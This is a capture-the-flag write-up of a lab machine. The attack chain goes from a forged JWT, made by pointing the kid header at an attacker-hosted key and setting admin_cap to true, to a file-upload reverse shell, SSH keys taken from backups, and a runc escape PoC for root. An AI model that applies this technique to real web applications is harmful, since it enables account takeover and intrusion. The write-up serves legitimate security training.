# TheNotebook

ip: 10.10.10.230

## nmap
![[Screenshot 2021-03-08 at 10.56.11 AM.png]]

## webpage

register, write notes, and it will assign a uuid and a cookie

![[Screenshot 2021-03-08 at 11.03.40 AM.png]]

uuid=5249f569-550a-4c41-a022-ac05bdf0a944

Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImRlayIsImVtYWlsIjoiZGVrQGZybC5jb20iLCJhZG1pbl9jYXAiOmZhbHNlfQ.epKQLwQxEsclVGk5RxhyPRxVmNlMyDJGTDnahERGQsQDAXBPwKykzx8ivAV-_O_PCA2WcQgOkKLM4RPn6EU3KlVVUWOCdjj6xTIRzbYAhuEZxX4tnRTTKto0fFrcZzlhfW_G9Brgu7S77lVAK0kSsw2RX8OcCqk1pyezMG52FUi8afGDNSOcExXQrwqQGTmKPlSupwARnbVuUC0Lpe_cw2t-BRAeBOshNdxFeK-JcFwFix2zeffjYbUOa8F3Cm8z_EzKP1zNQ-VlGf81vYuijSi-lWhvYHJhrJ99D6x9ey3RyO6DoFcA05Aed5npdcWOedUTn2GjjSwhqpG6rk6UxbH-bGE1rJgD8jhRpbKJs_vLcdiU5TDZojYsYjYzpz_c1ZR0yqBSSsy1eFAxXN0VbJS5QfQMu6oYkmIcl6TFKq4i1ggFAPSJfCpcvrFDqbXRYshr4iqT4B1p29XEgvRoObTdO4Wp5Ar6Mv9ERsZEQFQHbCREvjsLx4vt5hu4f_2cUpXXbHBH7ZgmDqQRf34Xnf9t3nt6fRu90SDSyzg2chDfoiNw2oHWM3QjpVVL7waB8D1ltqdrbYBMLnCm0ROLN2xBngmudpo2LNMskUlPXkK6n8exhsmdi4XDjf77k-PYB6y5KSY_cGG8BtCZNxc1giCGxuAgWJEg9BMyu38w8gY;

looking up about auth cookie I found jwt, lets see that too, what that is.
![[Screenshot 2021-03-08 at 11.17.32 AM.png]]

https://jwt.io/

upon pasting the token..
we get something interesting...
![[Screenshot 2021-03-08 at 11.20.12 AM.png]]

its using keys for the auth (prob. gpg keys) and kid at port 7070 

https://auth0.com/blog/navigating-rs256-and-jwks/

on researching and from the jwt.io itself, we can create out own token for auth.. 
lets create one and exploit it.

create a new rsa key pair

https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9

```bash
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
# Don't add passphrase
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
cat jwtRS256.key
cat jwtRS256.key.pub
```

here now edit the payload and the details in jwt.io to the one matching to the original token, but change the localhost to your own tun0 ip, change admin_cap to true 

And make sure the algorithm is set to RS256

It should look like this, signature verified.

![[Screenshot 2021-03-08 at 12.16.26 PM.png]]
![[Screenshot 2021-03-08 at 12.16.12 PM.png]]

before changing the cookie, change the priv key name to privKey.key as that is called on and spin the server on port 7070.

new cookie/token:(on the left)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNTo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6ImRlayIsImVtYWlsIjoiZGVrQGZybC5jb20iLCJhZG1pbl9jYXAiOnRydWV9.usHHdoQtVumPs4U2ZDBf2_72HmOwhYAzxkmHfiDqG9oexElrH4feArh-A5_t0faOKR6wgoTx78cI7TftRhSdiNDHeBpWKt4XV_51h9KDLdyTBMqM62Tbqs4J9xG9jKgfR50b2wpO_hT2_77cq6ZyCy_IV-qECxGvcGIDpqIOqCFRivyuu7Kq_QLafSjbhLfoMdU31c36Dl2ahj8p1V61griHgU3Du_TpJvUdM8jfmIV_AvyIAG22ekLGLZUTr6ENOQmBhYxCVIB6HEc9WC5dJ08Vswi7MesVBXvDbXNJqfm2U6XLII94B2hPJD5efqBLi4sDuoSIRM290WsdicRSvRlC3MTHen_t6BbP7L7Um5N9prsJCJmt5hbKBisewDG46ASrEEOKxEXJlpM3kV0R0-dupZcpIS3JEl2DSvF61PHI82V6MwaFK3Lxxq5m09-2B98dP3RnshQH8OR5Wh0vdQx-nN06YHh5tSf4x1t7mdPzSjhmkmH3gskGs5h1_7n_ke_CGisjGnyPJrjgcqTU1g7xIedoCjb15-RtLR4vEXxGPwDYZX7lBEot-_cXg16XT74-pEwYpBk1etsH36QGnhpkDfO6Efa2ROxf4Qc46QwkNUpsxO6k89RYP0_CW-MJDnqCAGWZrtlJh7lyYW7TuiGkdczab5q6O2xmUEETQC0
```

change the token and our priv key is been picked

![[Screenshot 2021-03-08 at 12.20.55 PM.png]]

and now we are admin, (but the thing is we have to change the cookie every time we switch the pages or send some requests)
![[Screenshot 2021-03-08 at 12.22.32 PM.png]]

and we can upload the files
![[Screenshot 2021-03-08 at 12.24.18 PM.png]]

uploaded 
![[Screenshot 2021-03-08 at 12.26.18 PM.png]]

now view 
![[Screenshot 2021-03-08 at 12.26.32 PM.png]]

got rev shell as www-data
![[Screenshot 2021-03-08 at 12.27.18 PM.png]]


## user

In /var/backups/ there is home.tar.gz file

sending the file
![[Screenshot 2021-03-08 at 12.33.18 PM.png]]

getting the tar.gz file
![[Screenshot 2021-03-08 at 12.34.26 PM.png]]

Unzipping we got the ssh keys
![[Screenshot 2021-03-08 at 12.35.26 PM.png]]

give permission and ssh into the server

![[Screenshot 2021-03-08 at 12.38.55 PM.png]]

![[Screenshot 2021-03-08 at 12.40.38 PM.png]]

user hash ==== 23fdba116afd21df6801b85308a107fe

## root

![[Screenshot 2021-03-08 at 12.47.26 PM.png]]

`/usr/bin/docker exec -it webapp-dev01*`

searching for the exploit, the first website is interesting 

![[Screenshot 2021-03-08 at 12.55.20 PM.png]]

https://github.com/Frichetten/CVE-2019-5736-PoC

